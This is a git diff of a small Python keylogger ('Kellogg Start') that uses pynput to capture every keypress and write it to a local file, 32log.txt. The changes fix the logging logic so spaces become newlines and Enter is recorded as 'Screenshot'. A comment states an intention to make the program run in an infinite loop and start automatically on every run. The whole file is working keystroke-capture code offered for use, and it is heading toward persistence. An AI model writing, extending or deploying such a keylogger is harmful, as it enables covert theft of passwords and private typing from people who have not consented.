@@ -1,6 +1,8 @@
 print("Kellogg Start")
 from pynput.keyboard import Key, Listener
 
+
+
 count = 0
 keys = []
 
@@ -16,21 +18,23 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
-    with open("32log.txt", "a") as f:
+    
+    with open("32log.txt", "w") as f:
         for key in keys:
-            k = str(key).replace("'","'")
-'''            if k.find("space")>0:
-                f.write("/n")
-            elif k.find("key") == -1:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
                 f.write(k)
-'''
-def on_release(key):
+            elif k.find("enter") >0:
+                f.write("Screenshot")
+            
+def on_release(key):     
     if key == Key.esc:
-        f.write("program end")
         return False
-    if key == key.enter:
-        print("Take Screenshot")
-
+    #if we want I can make this save the txt file then run an inf. loop
+    #then make it always begin start on run
+print("New Session Started")
 print("UPDATE:")
 with Listener(on_press=on_press, on_release=on_release)as listener:
     listener.join()
